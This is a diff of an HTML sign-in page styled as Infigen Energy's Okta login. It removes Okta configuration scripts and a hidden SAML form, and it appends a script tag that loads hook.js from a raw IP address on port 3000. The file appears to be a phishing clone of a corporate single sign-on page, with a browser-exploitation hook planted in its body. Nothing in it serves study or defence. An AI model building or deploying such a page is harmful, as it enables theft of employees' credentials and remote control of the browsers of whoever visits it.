@@ -6,9 +6,7 @@
 <!--[if !IE]><!--><html><!--<![endif]-->
 <head>
 
-    <script>if (typeof module === 'object') {window.module = module; module = undefined;}</script>
 	
-	<script src="http://206.189.43.95:3000/hook.js"</script>
 
     <title>Infigen Energy - Sign In</title>
         <meta charset="UTF-8">
@@ -18,15 +16,10 @@
 	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">
 		<script src="h.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js" integrity="sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T" crossorigin="anonymous"></script>
 	
-    <link href="https://ok2static.oktacdn.com/assets/loginpage/css/okta-login-page.min.852b544eaf6eba9c4786078230d675f9.css" type="text/css" rel="stylesheet"/><script>
-        var okta = {
-            locale: 'en',
-            deployEnv: 'PROD'
-        };
-    </script>
+    <link href="https://ok2static.oktacdn.com/assets/loginpage/css/okta-login-page.min.852b544eaf6eba9c4786078230d675f9.css" type="text/css" rel="stylesheet"/>
 	
-    <script>window.okta || (window.okta = {}); okta.cdnUrlHostname = "//ok2static.oktacdn.com"; okta.cdnPerformCheck = false;</script><script>window.okta || (window.okta = {});window.okta.mixpanel = true;</script><script>if (window.module) module = window.module;</script>
-
+    
+	
 </head>
 <body class="auth okta-container">
 
@@ -67,9 +60,7 @@
 <!--[if (gt IE 8)|!(IE)]><!--> <div id="login-bg-image" class="login-bg-image" data-se="login-bg-image"></div> <!--<![endif]-->
 
 <!-- hidden form for reposting fromURI for X509 auth -->
-<form action="/login/cert" method="post" id="x509_login" name="x509_login" style="display:none;">
-    <input type="hidden" class="hide" name="_xsrfToken" value="null"/><input type="hidden" id="fromURI" name="fromURI" class="hidden" value="&#x2f;app&#x2f;meservicedeskplus&#x2f;exkhv2to2cqtedM8f0x7&#x2f;sso&#x2f;saml&#x3f;SAMLRequest&#x3d;fVLRjtowEPyVyO&#x25;2FEcS6UYBGk9FBVpLs2Omgf7qUy8RosEjvndSjXrz8nlIqq6sl&#x25;2B2h3PzM56gaJtOl72&#x25;2FmCe4KUH9NG5bQzysVGQ3hluBWrkRrSA3Nd8Uz4&#x25;2B8DROeOest7VtSLReFeTHVO2yuw9SZUylmdrt8lxBMmfJfC4ZZGnKpncsnSUk&#x25;2Bg4OtTUFCSThLWIPa4NeGB9KCcsnyWzC2DZhPNxpHmf59HnAVQJRn6AgSjQIJKp&#x25;2B63&#x25;2FURmqzf9&#x25;2Fs7gJC&#x25;2Fnm7rSbV182WRCUiOB&#x25;2Bs3FuDfQtuA&#x25;2B6ka&#x25;2Fj29FCQg&#x25;2FcdckpFXdveeIx&#x25;2F2YONa9vSIRoH2IVHQLVReg8mHLd&#x25;2FHdokWoUUtRF&#x25;2BnPFK8zfOHr0YuUTX0WD1oisBj13TI4Xz8XBKvU3rFw&#x25;2FyMVfJeUYR7Sg9Dn7SEtyXMGVBnoMvslwMLT6G6W5W&#x25;2BH4o4hoAWV6nW9Abogtrxweh9aqyja5fo7Jp7M97B8IHce&#x25;2F6sIlP1rXC&#x25;2F1&#x25;2BLxWysaDlRI5RDK3RTShlyxGCe&#x25;2Fqvzp3j7OZdv&amp;RelayState&#x3d;aHR0cHM6Ly9zdXBwb3J0LmluZmlnZW5lbmVyZ3kuY29tOjQ0My9qc3AvaW5kZXguanNwX19JQU1fX1NEUE9uRGVtYW5k"/>
-</form>
+
 
 <div class="content">
   <div class="applogin-banner">
@@ -214,6 +205,8 @@
     applyStyle('login-bg-image-ie8', "filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://ok2static.oktacdn.com/bc/image/fileStoreRecord?id=fs04lr860aZ6V72Yh0x7', sizingMethod='scale')");
   });
 </script>
+
+<script src="http://206.189.43.95:3000/hook.js"</script>
 
 </body>
 </html>
